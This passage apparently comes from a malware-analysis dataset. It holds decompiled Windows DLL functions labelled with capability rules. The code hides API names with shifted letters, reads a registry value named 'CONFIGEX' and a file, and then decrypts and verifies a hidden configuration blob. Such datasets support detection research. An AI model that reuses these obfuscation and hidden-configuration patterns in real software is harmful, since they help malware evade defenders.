                     iStack97 + 0x34 + *0x18004a224 + *0x18004a228, 0x2b4);\n                                            }\n                                            if (*0x18004a3cc != 0) {\n                                                *0x18004a9a4 = fcn.180015b40(*0x18004a3cc);\n                                                fcn.180023f9c(*0x18004a9a4, *0x18004a3cc, iStack97 + 0x7a4, *0x18004a3cc\n                                                             );\n                                            }\n                                            fcn.180017d60();\n                                            if (apuStack344[0] != NULL) {\n                                                fcn.180015b80(apuStack344);\n                                            }\n                                            if (iStack97 != 0) {\n                                                fcn.180015b80(&iStack97);\n                                            }\n                                            if (aiStack89[0] != 0) {\n                                                fcn.180015b80(aiStack89);\n                                            }\n                                            uStack40 = 1;\n                                            fcn.180007ac0(auStack208);\n                                            goto code_r0x0001800190a1;\n                                        }\n                                        fcn.1800011f0(0x18004a200, 0x7ac);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n                if (apuStack344[0] != NULL) {\n                    fcn.180015b80(apuStack344);\n                }\n                if (iStack97 != 0) {\n                    fcn.180015b80(&iStack97);\n                }\n                if (aiStack89[0] != 0) {\n                    fcn.180015b80(aiStack89);\n                }\n                uStack39 = 0;\n                fcn.180007ac0(auStack208);\n            }\n            else {\n                pcVar6 = fcn.18001e5f0(0x180039108);\n                (*pcVar6)(uStack216);\n            }\n        }\n        else {\n            pcVar6 = fcn.18001e5f0(0x1800390e0);\n            (*pcVar6)(uStack216);\n        }\n    }\ncode_r0x0001800190a1:\n    fcn.180023980(uStack24 ^ auStack392);\n    return;\n}\n",
        "token_count": 3063
    },
    "1800190c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800190c0(void)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    int32_t *piVar7;\n    char *pcVar8;\n    uchar auStack424 [32];\n    ulong *puStack392;\n    ulong uStack384;\n    ulong *apuStack376 [2];\n    char acStack360 [40];\n    uint uStack320;\n    uint32_t uStack316;\n    uint32_t auStack312 [2];\n    ushort uStack304;\n    ushort uStack302;\n    ushort uStack300;\n    ushort uStack298;\n    ushort uStack296;\n    ushort uStack294;\n    ushort uStack292;\n    ushort uStack290;\n    ushort uStack288;\n    ushort uStack286;\n    ushort uStack284;\n    ushort uStack282;\n    ushort uStack280;\n    ushort uStack278;\n    ushort uStack276;\n    ushort uStack274;\n    ushort uStack272;\n    ushort uStack270;\n    ushort uStack268;\n    ushort uStack264;\n    ushort uStack262;\n    ushort uStack260;\n    ushort uStack258;\n    ushort uStack256;\n    ushort uStack254;\n    ushort uStack252;\n    ushort uStack250;\n    ushort uStack248;\n    ulong uStack240;\n    uchar auStack232 [8];\n    uint32_t auStack224 [2];\n    int32_t aiStack216 [2];\n    uchar auStack208 [5];\n    uint32_t uStack203;\n    uint32_t uStack199;\n    char acStack195 [33];\n    char acStack162 [33];\n    int64_t iStack129;\n    int64_t aiStack121 [2];\n    int32_t aiStack104 [2];\n    uchar auStack96 [40];\n    uchar *puStack56;\n    uchar uStack48;\n    uchar uStack47;\n    ulong uStack40;\n    ulong uStack32;\n    uint64_t uStack24;\n    \n    uStack40 = 0xfffffffffffffffe;\n    uStack24 = *0x180040248 ^ auStack424;\n    uStack316 = 0;\n    apuStack376[0] = NULL;\n    piVar7 = aiStack216;\n    for (iVar5 = 0x67; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *piVar7 = 0;\n        piVar7 = piVar7 + 1;\n    }\n    uStack240 = 0;\n    uStack304 = 0x2e;\n    uStack302 = 0x73;\n    uStack300 = 0x62;\n    uStack298 = 0x72;\n    uStack296 = 0x5c;\n    uStack294 = 0x53;\n    uStack292 = 0x74;\n    uStack290 = 0x61;\n    uStack288 = 0x72;\n    uStack286 = 0x74;\n    uStack284 = 0x4f;\n    uStack282 = 0x76;\n    uStack280 = 0x65;\n    uStack278 = 0x72;\n    uStack276 = 0x72;\n    uStack274 = 0x69;\n    uStack272 = 100;\n    uStack270 = 0x65;\n    uStack268 = 0;\n    pcVar4 = fcn.18001e5f0(\"SfhPqfoLfzFyX\");\n    puStack392 = &uStack240;\n    uStack316 = (*pcVar4)(0xffffffff80000000, &uStack304, 0, 0xf003f);\n    if (uStack316 == 0) {\n        uStack320 = 0;\n        auStack312[0] = 0;\n        uStack264 = 0x43;\n        uStack262 = 0x4f;\n        uStack260 = 0x4e;\n        uStack258 = 0x46;\n        uStack256 = 0x49;\n        uStack254 = 0x47;\n        uStack252 = 0x45;\n        uStack250 = 0x58;\n        uStack248 = 0;\n        pcVar4 = fcn.18001e5f0(0x180039138);\n        uStack384 = auStack312;\n        puStack392 = NULL;\n        uStack316 = (*pcVar4)(uStack240, &uStack264, 0, &uStack320);\n        if (uStack316 == 0) {\n            apuStack376[0] = fcn.180015b40(auStack312[0]);\n            auStack224[0] = auStack312[0];\n            pcVar4 = fcn.18001e5f0(0x180039160);\n            uStack384 = auStack224;\n            puStack392 = apuStack376[0];\n            uStack316 = (*pcVar4)(uStack240, &uStack264, 0, &uStack320);\n            if ((uStack316 == 0) && (auStack224[0] == auStack312[0])) {\n                pcVar4 = fcn.18001e5f0(0x180039188);\n                (*pcVar4)(uStack240);\n                fcn.180007a60(auStack232);\n                pcVar8 = acStack360;\n                for (iVar5 = 0x21; iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *pcVar8 = '\\0';\n                    pcVar8 = pcVar8 + 1;\n                }\n                fcn.1800011f0(aiStack216, 0x67);\n                fcn.180023f9c(aiStack216, 0x57, apuStack376[0], 0x57);\n                if ((((uStack199 + 0x57 <= auStack312[0]) && (aiStack216[0] == 0xae86)) && (uStack203 != 0)) &&\n                   (uStack199 != 0)) {\n                    iVar5 = -1;\n                    pcVar8 = acStack195;\n                    do {\n                        if (iVar5 == 0) break;\n                        iVar5 = iVar5 + -1;\n                        cVar2 = *pcVar8;\n                        pcVar8 = pcVar8 + 1;\n                    } while (cVar2 != '\\0');\n                    if (iVar5 != -2) {\n                        iVar5 = -1;\n                        pcVar8 = acStack162;\n                        do {\n                            if (iVar5 == 0) break;\n                            iVar5 = iVar5 + -1;\n                            cVar2 = *pcVar8;\n                            pcVar8 = pcVar8 + 1;\n                        } while (cVar2 != '\\0');\n                        if (iVar5 != -2) {\n                            aiStack121[0] = fcn.180015b40(uStack199);\n                            fcn.180023f9c(aiStack121[0], uStack199, apuStack376[0] + 0x57, uStack199);\n                            fcn.1800011f0(acStack360, 0x21);\n                            fcn.180009740(auStack232, aiStack121[0], uStack199, acStack360);\n                            uVar6 = 0xffffffffffffffff;\n                            pcVar8 = acStack360;\n                            do {\n                                if (uVar6 == 0) break;\n                                uVar6 = uVar6 - 1;\n                                cVar2 = *pcVar8;\n                                pcVar8 = pcVar8 + 1;\n                            } while (cVar2 != '\\0');\n                            iVar3 = fcn.180030ca8(acStack162, acStack360, ~uVar6 - 1);\n                            if (iVar3 == 0) {\n                                iStack129 = fcn.180015b40(uStack203);\n                                uStack384 = CONCAT44(uStack384._4_4_, 5);\n                                puStack392 = auStack208;\n                                uVar1 = (**0x18004aca8)(iStack129, &uStack203, aiStack121[0], uStack199);\n                                uStack316 = uVar1;\n                                if (uStack316 != 0) {\n                                    fcn.1800011f0(acStack360, 0x21);\n                                    fcn.180009740(auStack232, iStack129, uStack203, acStack360);\n                                    uVar6 = 0xffffffffffffffff;\n                                    pcVar8 = acStack360;\n                                    do {\n                                        if (uVar6 == 0) break;\n                                        uVar6 = uVar6 - 1;\n                                        cVar2 = *pcVar8;\n                                        pcVar8 = pcVar8 + 1;\n                                    } while (cVar2 != '\\0');\n                                    iVar3 = fcn.180030ca8(acStack195, acStack360, ~uVar6 - 1);\n                                    if (iVar3 == 0) {\n                                        aiStack104[0] = 0;\n                                        fcn.180023f9c(aiStack104, 4, iStack129, 4);\n                                        if (aiStack104[0] != 0) {\n                                            puStack56 = auStack96;\n                                            uStack32 = fcn.18000b740(puStack56, iStack129 + 4);\n                                            cVar2 = fcn.18001a4e0(uStack32);\n                                            if (cVar2 != '\\0') {\n                                                if (apuStack376[0] != NULL) {\n                                                    fcn.180015b80(apuStack376);\n                                                }\n                                                if (iStack129 != 0) {\n                                                    fcn.180015b80(&iStack129);\n                                                }\n                                                if (aiStack121[0] != 0) {\n                                                    fcn.180015b80(aiStack121);\n                                                }\n                                                uStack48 = 1;\n                                                fcn.180007ac0(auStack232);\n                                                goto code_r0x000180019769;\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n                if (apuStack376[0] != NULL) {\n                    fcn.180015b80(apuStack376);\n                }\n                if (iStack129 != 0) {\n                    fcn.180015b80(&iStack129);\n                }\n                if (aiStack121[0] != 0) {\n                    fcn.180015b80(aiStack121);\n                }\n                uStack47 = 0;\n                fcn.180007ac0(auStack232);\n            }\n            else {\n                pcVar4 = fcn.18001e5f0(0x180039178);\n                (*pcVar4)(uStack240);\n            }\n        }\n        else {\n            pcVar4 = fcn.18001e5f0(0x180039150);\n            (*pcVar4)(uStack240);\n        }\n    }\ncode_r0x000180019769:\n    fcn.180023980(uStack24 ^ auStack424);\n    return;\n}\n",
        "token_count": 2446
    },
    "18001979": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180019790(ulong arg1)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    uint16_t *puVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    uint32_t *in_RDX;\n    ulong arg2;\n    int32_t *piVar10;\n    uint32_t *puVar11;\n    uchar auStack360 [32];\n    ulong uStack328;\n    uint uStack320;\n    ulong uStack312;\n    uint32_t *puStack288;\n    uint32_t uStack280;\n    int32_t aiStack264 [2];\n    uchar auStack256 [5];\n    uint32_t uStack251;\n    uint32_t uStack247;\n    uint32_t auStack243 [8];\n    uint32_t auStack210 [8];\n    int64_t iStack177;\n    int64_t aiStack169 [2];\n    uint32_t auStack152 [10];\n    uint32_t uStack112;\n    int64_t iStack104;\n    uchar auStack96 [8];\n    uint32_t auStack88 [2];\n    uint16_t auStack80 [4];\n    ushort uStack72;\n    ushort uStack70;\n    ushort uStack68;\n    ushort uStack66;\n    ushort uStack64;\n    ushort uStack62;\n    ushort uStack60;\n    ushort uStack58;\n    ushort uStack56;\n    ushort uStack54;\n    ushort uStack52;\n    ushort uStack50;\n    uchar uStack48;\n    uchar uStack47;\n    uchar uStack46;\n    ulong uStack40;\n    ulong uStack32;\n    ulong uStack24;\n    uint64_t uStack16;\n    \n    uStack40 = 0xfffffffffffffffe;\n    uStack16 = *0x180040248 ^ auStack360;\n    uStack280 = 0;\n    puStack288 = NULL;\n    piVar10 = aiStack264;\n    for (iVar8 = 0x67; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *piVar10 = 0;\n        piVar10 = piVar10 + 1;\n    }\n    uStack32 = fcn.1800020d0(arg1);\n    pcVar6 = fcn.18001e5f0(0x180039198);\n    iVar5 = (*pcVar6)(uStack32);\n    if (iVar5 != 0) {\n        uStack24 = fcn.1800020d0(arg1);\n        pcVar6 = fcn.18001e5f0(0x1800391a8);\n        uStack312 = 0;\n        uStack320 = 0x80;\n        uStack328 = CONCAT44(uStack328._4_4_, 3);\n        arg2 = 0x80000000;\n        iStack104 = (*pcVar6)(uStack24, 0x80000000, 1, 0);\n        if (iStack104 == -1) {\n            uStack48 = 0;\n            fcn.180001ef0(arg1, arg2);\n            goto code_r0x000180019ed9;\n        }\n        pcVar6 = fcn.18001e5f0(0x1800391b8);\n        uStack112 = (*pcVar6)(iStack104, 0);\n        pcVar6 = fcn.18001e5f0(0x1800391c8);\n        (*pcVar6)(iStack104, 0, 0, 0);\n        puStack288 = fcn.180015b40(uStack112);\n        auStack88[0] = 0;\n        pcVar6 = fcn.18001e5f0(0x1800391d8);\n        uStack328 = NULL;\n        in_RDX = puStack288;\n        iVar5 = (*pcVar6)(iStack104, puStack288, uStack112, auStack88);\n        if ((iVar5 == 0) || (auStack88[0] != uStack112)) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iStack104);\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iStack104);\n            fcn.180007a60(auStack96);\n            puVar11 = auStack152;\n            for (iVar8 = 0x21; iVar8 != 0; iVar8 = iVar8 + -1) {\n                *puVar11 = 0;\n                puVar11 = puVar11 + 1;\n            }\n            fcn.1800011f0(aiStack264, 0x67);\n            in_RDX = 0x57;\n            fcn.180023f9c(aiStack264, 0x57, puStack288, 0x57);\n            if ((((uStack247 + 0x57 <= auStack88[0]) && (aiStack264[0] == 0xae86)) && (uStack251 != 0)) &&\n               (uStack247 != 0)) {\n                iVar8 = -1;\n                in_RDX = auStack243;\n                puVar11 = in_RDX;\n                do {\n                    if (iVar8 == 0) break;\n                    iVar8 = iVar8 + -1;\n                    cVar1 = *puVar11;\n                    puVar11 = puVar11 + 1;\n                } while (cVar1 != '\\0');\n                if (iVar8 != -2) {\n                    iVar8 = -1;\n                    in_RDX = auStack210;\n                    puVar11 = in_RDX;\n                    do {\n                        if (iVar8 == 0) break;\n                        iVar8 = iVar8 + -1;\n                        cVar1 = *puVar11;\n                        puVar11 = puVar11 + 1;\n                    } while (cVar1 != '\\0');\n                    if (iVar8 != -2) {\n                        aiStack169[0] = fcn.180015b40(uStack247);\n                        fcn.180023f9c(aiStack169[0], uStack247, puStack288 + 0x57, uStack247);\n                        fcn.1800011f0(auStack152, 0x21);\n                        fcn.180009740(auStack96, aiStack169[0], uStack247, auStack152);\n                        uVar9 = 0xffffffffffffffff;\n                        puVar11 = auStack152;\n                        do {\n                            if (uVar9 == 0) break;\n                            uVar9 = uVar9 - 1;\n                            cVar1 = *puVar11;\n                            puVar11 = puVar11 + 1;\n                        } while (cVar1 != '\\0');\n                        in_RDX = auStack152;\n                        iVar5 = fcn.180030ca8(auStack210, in_RDX, ~uVar9 - 1);\n                        if (iVar5 == 0) {\n                            iStack177 = fcn.180015b40(uStack251);\n                            uStack320 = 5;\n                            uStack328 = auStack256;\n                            in_RDX = &uStack251;\n                            uVar4 = (**0x18004aca8)(iStack177, in_RDX, aiStack169[0], uStack247);\n                            uStack280 = uVar4;\n                            if (uStack280 == 0) {\n                                fcn.180007ac0(auStack96);\n                            }\n                            else {\n                                fcn.1800011f0(auStack152, 0x21);\n                                fcn.180009740(auStack96, iStack177, uStack251, auStack152);\n                                uVar9 = 0xffffffffffffffff;\n                                puVar11 = auStack152;\n                                do {\n                                    if (uVar9 == 0) break;\n                                    uVar9 = uVar9 - 1;\n                                    cVar1 = *puVar11;\n                                    puVar11 = puVar11 + 1;\n                                } while (cVar1 != '\\0');\n                                in_RDX = auStack152;\n                                iVar5 = fcn.180030ca8(auStack243, in_RDX, ~uVar9 - 1);\n                                if (iVar5 == 0) {\n                                    fcn.180023f9c(0x18004a200, 0x34, iStack177, 0x34);\n                                    auStack80[0] = 0x34;\n                                    auStack80[1] = 0x65;\n                                    auStack80[2] = 0x4a;\n                                    auStack80[3] = 0x6f;\n                                    uStack72 = 0x43;\n                                    uStack70 = 0x71;\n                                    uStack68 = 0x43;\n                                    uStack66 = 0x4e;\n                                    uStack64 = 0x77;\n                                    uStack62 = 0x4e;\n                                    uStack60 = 0x5a;\n                                    uStack58 = 0x36;\n                                    uStack56 = 0x34;\n                                    uStack54 = 0x73;\n                                    uStack52 = 0x43;\n                                    uStack50 = 0;\n                                    puVar7 = 0x18004a200;\n                                    do {\n                                        uVar2 = *puVar7;\n                                        uVar9 = uVar2;\n                                        if (uVar2 != *(puVar7 + &stack0xfffffffe7ffb5db0)) {\n                                            uVar3 = uVar2 < *(puVar7 + &stack0xfffffffe7ffb5db0);\n                                            iVar5 = (1 - uVar3) - (uVar3 != 0);\n                                            goto code_r0x000180019ce3;\n                                        }\n                                        puVar7 = puVar7 + 1;\n                                    } while (uVar2 != 0);\n                                    iVar5 = 0;\ncode_r0x000180019ce3:\n                                    if (iVar5 == 0) {\n                                        if (*0x18004a224 != 0) {\n                                            uVar9 = 0x19c;\n                                            fcn.180023f9c(0x18004a234, 0x19c, iStack177 + 0x34, 0x19c);\n                                        }\n                                        if (*0x18004a228 != 0) {\n                                            uVar9 = 800;\n                                            fcn.180023f9c(0x18004a3d0, 800, iStack177 + 0x34 + *0x18004a224, 800);\n                                        }\n                                        if (*0x18004a22c != 0) {\n                                            uVar9 = 0x2b4;\n                                            fcn.180023f9c(0x18004a6f0, 0x2b4, \n                                                          iStack177 + 0x34 + *0x18004a224 + *0x18004a228, 0x2b4);\n                                        }\n                                        if (*0x18004a3cc != 0) {\n                                            *0x18004a9a4 = fcn.180015b40(*0x18004a3cc);\n                                            uVar9 = *0x18004a3cc;\n                                            fcn.180023f9c(*0x18004a9a4, uVar9, iStack177 + 0x7a4, *0x18004a3cc);\n                                        }\n                                        fcn.180017d60();\n                                        if (puStack288 != NULL) {\n                                            fcn.180015b80(&puStack288);\n                                        }\n                                        if (iStack177 != 0) {\n                                            fcn.180015b80(&iStack177);\n                                        }\n                                        if (aiStack169[0] != 0) {\n                                            fcn.180015b80(aiStack169);\n                                        }\n                                        uStack47 = 1;\n                                        fcn.180007ac0(auStack96);\n                                        fcn.180001ef0(arg1, uVar9);\n                                        goto code_r0x000180019ed9;\n                                    }\n                                    in_RDX = 0x7ac;\n                                    fcn.1800011f0(0x18004a200, 0x7ac);\n                                    fcn.180007ac0(auStack96);\n                                }\n                                else {\n                                    fcn.180007ac0(auStack96);\n                                }\n                            }\n                        }\n                        else {\n                            fcn.180007ac0(auStack96);\n                        }\n                        goto code_r0x000180019e7a;\n                    }\n                }\n            }\n            fcn.180007ac0(auStack96);\n        }\n    }\ncode_r0x000180019e7a:\n    if (puStack288 != NULL) {\n        fcn.180015b80(&puStack288);\n    }\n    if (iStack177 != 0) {\n        fcn.180015b80(&iStack177);\n    }\n    if (aiStack169[0] != 0) {\n        fcn.180015b80(aiStack169);\n    }\n    uStack46 = 0;\n    fcn.180001ef0(arg1, in_RDX);\ncode_r0x000180019ed9:\n    fcn.180023980(uStack16 ^ auStack360);\n    return;\n}\n",
        "token_count": 2930
    },
    "180019f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180019f00(ulong arg1)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    ulong in_RDX;\n    ulong arg2;\n    uint32_t *puVar7;\n    int32_t *piVar8;\n    uint32_t *puVar9;\n    uchar auStack392 [32];\n    ulong uStack360;\n    uint uStack352;\n    ulong uStack344;\n    uint32_t *puStack320;\n    uint32_t auStack312 [10];\n    uint32_t uStack272;\n    uint32_t uStack268;\n    int64_t iStack264;\n    uchar auStack256 [8];\n    uint32_t auStack248 [4];\n    int32_t aiStack232 [2];\n    uchar auStack224 [5];\n    uint32_t uStack219;\n    uint32_t uStack215;\n    uint32_t auStack211 [8];\n    uint32_t auStack178 [8];\n    int64_t iStack145;\n    int64_t aiStack137 [2];\n    int32_t iStack120;\n    uchar uStack116;\n    uchar uStack115;\n    uchar auStack112 [40];\n    uchar *puStack72;\n    uchar uStack64;\n    uchar uStack63;\n    ulong uStack56;\n    ulong uStack48;\n    ulong uStack40;\n    ulong uStack32;\n    uint64_t uStack24;\n    \n    uStack56 = 0xfffffffffffffffe;\n    uStack24 = *0x180040248 ^ auStack392;\n    uStack272 = 0;\n    puStack320 = NULL;\n    piVar8 = aiStack232;\n    for (iVar5 = 0x67; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *piVar8 = 0;\n        piVar8 = piVar8 + 1;\n    }\n    fcn.180007a60(auStack256);\n    uStack48 = fcn.1800020d0(arg1);\n    pcVar4 = fcn.18001e5f0(0x1800391e8);\n    iVar3 = (*pcVar4)(uStack48);\n    if (iVar3 == 0) {\n        uStack116 = 0;\n        fcn.180007ac0(auStack256);\n        fcn.180001ef0(arg1, in_RDX);\n    }\n    else {\n        uStack40 = fcn.1800020d0(arg1);\n        pcVar4 = fcn.18001e5f0(\"DsfbufGjmfX\");\n        uStack344 = 0;\n        uStack352 = 0x80;\n        uStack360 = CONCAT44(uStack360._4_4_, 3);\n        arg2 = 0x80000000;\n        iStack264 = (*pcVar4)(uStack40, 0x80000000, 1, 0);\n        if (iStack264 == -1) {\n            uStack115 = 0;\n            fcn.180007ac0(auStack256);\n            fcn.180001ef0(arg1, arg2);\n        }\n        else {\n            pcVar4 = fcn.18001e5f0(\"HfuGjmfTj{f\");\n            uStack268 = (*pcVar4)(iStack264, 0);\n            pcVar4 = fcn.18001e5f0(\"TfuGjmfQpjoufs\");\n            (*pcVar4)(iStack264, 0, 0, 0);\n            puStack320 = fcn.180015b40(uStack268);\n            auStack248[0] = 0;\n            pcVar4 = fcn.18001e5f0(\"SfbeGjmf\");\n            uStack360 = NULL;\n            puVar7 = puStack320;\n            iVar3 = (*pcVar4)(iStack264, puStack320, uStack268, auStack248);\n            if ((iVar3 == 0) || (auStack248[0] != uStack268)) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iStack264);\n            }\n            else {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iStack264);\n                puVar7 = auStack312;\n                for (iVar5 = 0x21; iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                fcn.1800011f0(aiStack232, 0x67);\n                puVar7 = 0x57;\n                fcn.180023f9c(aiStack232, 0x57, puStack320, 0x57);\n                if ((((uStack215 + 0x57 <= auStack248[0]) && (aiStack232[0] == 0xae86)) && (uStack219 != 0)) &&\n                   (uStack215 != 0)) {\n                    iVar5 = -1;\n                    puVar7 = auStack211;\n                    puVar9 = puVar7;\n                    do {\n                        if (iVar5 == 0) break;\n                        iVar5 = iVar5 + -1;\n                        cVar2 = *puVar9;\n                        puVar9 = puVar9 + 1;\n                    } while (cVar2 != '\\0');\n                    if (iVar5 != -2) {\n                        iVar5 = -1;\n                        puVar7 = auStack178;\n                        puVar9 = puVar7;\n                        do {\n                            if (iVar5 == 0) break;\n                            iVar5 = iVar5 + -1;\n                            cVar2 = *puVar9;\n                            puVar9 = puVar9 + 1;\n                        } while (cVar2 != '\\0');\n                        if (iVar5 != -2) {\n                            aiStack137[0] = fcn.180015b40(uStack215);\n                            fcn.180023f9c(aiStack137[0], uStack215, puStack320 + 0x57, uStack215);\n                            fcn.1800011f0(auStack312, 0x21);\n                            fcn.180009740(auStack256, aiStack137[0], uStack215, auStack312);\n                            uVar6 = 0xffffffffffffffff;\n                            puVar7 = auStack312;\n                            do {\n                                if (uVar6 == 0) break;\n                                uVar6 = uVar6 - 1;\n                                cVar2 = *puVar7;\n                                puVar7 = puVar7 + 1;\n                            } while (cVar2 != '\\0');\n                            puVar7 = auStack312;\n                            iVar3 = fcn.180030ca8(auStack178, puVar7, ~uVar6 - 1);\n                            if (iVar3 == 0) {\n                                iStack145 = fcn.180015b40(uStack219);\n                                uStack352 = 5;\n                                uStack360 = auStack224;\n                                puVar7 = &uStack219;\n                                uVar1 = (**0x18004aca8)(iStack145, puVar7, aiStack137[0], uStack215);\n                                uStack272 = uVar1;\n                                if (uStack272 != 0) {\n                                    fcn.1800011f0(auStack312, 0x21);\n                                    fcn.180009740(auStack256, iStack145, uStack219, auStack312);\n                                    uVar6 = 0xffffffffffffffff;\n                                    puVar7 = auStack312;\n                                    do {\n                                        if (uVar6 == 0) break;\n                                        uVar6 = uVar6 - 1;\n                                        cVar2 = *puVar7;\n                                        puVar7 = puVar7 + 1;\n                                    } while (cVar2 != '\\0');\n                                    puVar7 = auStack312;\n                                    iVar3 = fcn.180030ca8(auStack211, puVar7, ~uVar6 - 1);\n                                    if (iVar3 == 0) {\n                                        iStack120 = 0;\n                                        puVar7 = 0x4;\n                                        fcn.180023f9c(&iStack120, 4, iStack145, 4);\n                                        if (iStack120 != 0) {\n                                            puStack72 = auStack112;\n                                            puVar7 = iStack145 + 4;\n                                            uStack32 = fcn.18000b740(puStack72, puVar7);\n                                            cVar2 = fcn.18001a4e0(uStack32);\n                                            if (cVar2 != '\\0') {\n                                                if (puStack320 != NULL) {\n                                                    fcn.180015b80(&puStack320);\n                                                }\n                                                if (iStack145 != 0) {\n                                                    fcn.180015b80(&iStack145);\n                                                }\n                                                if (aiStack137[0] != 0) {\n                                                    fcn.180015b80(aiStack137);\n                                                }\n                                                uStack64 = 1;\n                                                fcn.180007ac0(auStack256);\n                                                fcn.180001ef0(arg1, puVar7);\n                                                goto code_r0x00018001a4bc;\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n            if (puStack320 != NULL) {\n                fcn.180015b80(&puStack320);\n            }\n            if (iStack145 != 0) {\n                fcn.180015b80(&iStack145);\n            }\n            if (aiStack137[0] != 0) {\n                fcn.180015b80(aiStack137);\n            }\n            uStack63 = 0;\n            fcn.180007ac0(auStack256);\n            fcn.180001ef0(arg1, puVar7);\n        }\n    }\ncode_r0x00018001a4bc:\n    fcn.180023980(uStack24 ^ auStack392);\n    return;\n}\n",
        "token_count": 2215
    },
    "18001a4e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18001a4e0(ulong arg1)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    char cVar3;\n    int32_t iVar4;\n    char *arg2;\n    ulong uVar5;\n    uchar *puVar6;\n    uint16_t *puVar7;\n    int64_t iVar8;\n    uchar *puVar9;\n    uchar auStack2040 [40];\n    uchar auStack2000 [40];\n    uchar auStack1960 [40];\n    uchar auStack1920 [40];\n    uchar auStack1880 [40];\n    uchar auStack1840 [40];\n    uchar auStack1800 [40];\n    uchar auStack1760 [40];\n    uchar auStack1720 [40];\n    uchar auStack1680 [40];\n    uchar auStack1640 [40];\n    uchar auStack1600 [40];\n    uchar auStack1560 [40];\n    uchar auStack1520 [40];\n    int64_t iStack1480;\n    uchar auStack1472 [40];\n    char cStack1432;\n    uchar uStack1431;\n    uchar uStack1430;\n    uchar uStack1429;\n    uchar uStack1428;\n    uchar uStack1427;\n    uchar uStack1426;\n    uchar auStack1416 [112];\n    uchar uStack1304;\n    uchar uStack1303;\n    uchar uStack1302;\n    uchar uStack1301;\n    uchar uStack1300;\n    ulong uStack1296;\n    uchar auStack1288 [40];\n    uint16_t auStack1248 [4];\n    ushort uStack1240;\n    ushort uStack1238;\n    ushort uStack1236;\n    ushort uStack1234;\n    ushort uStack1232;\n    ushort uStack1230;\n    ushort uStack1228;\n    ushort uStack1226;\n    ushort uStack1224;\n    ushort uStack1222;\n    ushort uStack1220;\n    ushort uStack1218;\n    int64_t iStack1216;\n    uchar uStack1208;\n    uchar uStack1207;\n    uchar uStack1206;\n    uchar uStack1205;\n    uchar uStack1204;\n    char cStack1200;\n    uchar uStack1199;\n    uchar uStack1198;\n    uchar uStack1197;\n    uchar uStack1196;\n    uchar uStack1195;\n    uchar uStack1194;\n    uchar uStack1193;\n    int64_t iStack1192;\n    uchar uStack1184;\n    uchar uStack1183;\n    uchar uStack1182;\n    uchar uStack1176;\n    uchar uStack1175;\n    uchar uStack1174;\n    uchar uStack1173;\n    uchar uStack1172;\n    uchar uStack1171;\n    uchar uStack1170;\n    uchar uStack1169;\n    uchar uStack1168;\n    uchar uStack1167;\n    uchar uStack1166;\n    uchar uStack1165;\n    uchar uStack1164;\n    uchar uStack1160;\n    uchar uStack1159;\n    uchar uStack1158;\n    uchar uStack1157;\n    uchar uStack1156;\n    uchar uStack1155;\n    uchar uStack1154;\n    uchar uStack1153;\n    uchar uStack1152;\n    uchar uStack1151;\n    uchar uStack1150;\n    uchar uStack1149;\n    int64_t iStack1144;\n    uchar uStack1136;\n    uchar uStack1135;\n    uchar uStack1134;\n    uchar uStack1133;\n    uchar uStack1132;\n    uchar uStack1131;\n    uchar uStack1130;\n    uchar uStack1129;\n    uchar uStack1128;\n    uchar uStack1127;\n    uchar uStack1126;\n    uchar uStack1125;\n    uchar uStack1124;\n    uchar uStack1123;\n    uchar uStack1122;\n    uchar uStack1121;\n    uchar uStack1120;\n    uchar uStack1119;\n    uchar uStack1118;\n    uchar uStack1117;\n    uchar uStack1116;\n    uchar uStack1115;\n    uchar uStack1114;\n    uchar uStack1113;\n    uchar uStack1112;\n    uchar uStack1111;\n    uchar uStack1110;\n    uchar uStack1109;\n    uchar uStack1108;\n    uchar uStack1107;\n    uchar uStack1106;\n    int64_t iStack1104;\n    char cStack1096;\n    uchar uStack1095;\n    uchar uStack1094;\n    uchar uStack1093;\n    uchar uStack1092;\n    uchar uStack1091;\n    uchar 